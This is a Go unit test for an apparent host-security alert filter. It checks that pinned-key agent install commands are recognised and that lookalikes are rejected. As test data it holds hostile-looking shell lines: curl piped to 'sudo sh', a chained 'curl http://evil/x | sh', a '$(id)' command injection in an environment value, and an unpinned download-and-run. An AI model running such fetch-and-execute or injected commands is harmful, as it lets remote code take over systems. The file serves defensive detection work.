package alert

import "testing"

func TestIsInstallCommand(t *testing.T) {
	const pin = "sha256//+ly9LEG3QCp+KRjnwAy0yWifaoV58n4P1UfNoP1FW+M="
	const tok = "ddadc095ece3ce70f6db5453cdefe752.63997927db60ccd258ce0707aa5f10ecfdc871f518d47502a52ba38ee3c79c2f"
	ev := func(cmd string) string {
		return "[下载并执行] 命令匹配特征；命令：" + cmd + "；父进程：sshd"
	}
	for _, cmd := range []string{
		"sh -c curl -fsSLk --pinnedpubkey '" + pin + "' 'https://47.117.27.183:8443/i/" + tok + "?id=office' | sudo sh",
		"bash -c curl -fsSLk --pinnedpubkey '" + pin + "' https://10.0.0.5:8443/install/agent.sh | sudo SAFE_ENROLL_TOKEN='" + tok + "' SAFE_AGENT_ID=web-01 sh",
		"sh -c curl -fsSLk --pinnedpubkey '" + pin + "' 'https://safe.corp:8443/i/" + tok + "' | SAFE_ACTION=uninstall sh",
	} {
		if !IsInstallCommand(ev(cmd), pin) {
			t.Errorf("install command not recognized: %s", cmd)
		}
	}
	if !IsInstallCommand(ev("sh -c curl -fsSLk --pinnedpubkey '"+pin+"' 'https://h:8443/i/"+tok+"' | sudo sh")+"；位置：容器 abc", pin) {
		t.Error("container suffix")
	}

	other := "sha256//AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
	for _, cmd := range []string{
		// 其他管理中心（或攻击者服务器）的指纹
		"sh -c curl -fsSLk --pinnedpubkey '" + other + "' 'https://h:8443/i/" + tok + "' | sudo sh",
		// 拼接了其他命令
		"sh -c curl -fsSLk --pinnedpubkey '" + pin + "' 'https://h:8443/i/" + tok + "' | sudo sh; curl http://evil/x | sh",
		"bash -c export X=1; curl -fsSLk --pinnedpubkey '" + pin + "' https://h:8443/install/agent.sh | sh 2>&1 | sed s/a/b/",
		"sh -c curl -fsSLk --pinnedpubkey '" + pin + "' 'https://h:8443/i/" + tok + "' | sudo SAFE_X=$(id) sh",
		// 不是安装脚本的地址
		"sh -c curl -fsSLk --pinnedpubkey '" + pin + "' 'https://h:8443/download/x.sh' | sh",
		// 没有固定指纹
		"sh -c curl -fsSLk 'https://h:8443/i/" + tok + "' | sudo sh",
	} {
		if IsInstallCommand(ev(cmd), pin) {
			t.Errorf("should not be trusted: %s", cmd)
		}
	}
	if IsInstallCommand("[反弹 shell 命令] 命令匹配特征；命令：sh -c curl -fsSLk --pinnedpubkey '"+pin+"' 'https://h:8443/i/"+tok+"' | sudo sh；父进程：sshd", pin) {
		t.Error("other rules must not be downgraded")
	}
	if IsInstallCommand(ev("sh -c curl -fsSLk --pinnedpubkey '' 'https://h:8443/i/"+tok+"' | sudo sh"), "") {
		t.Error("empty pin")
	}
}
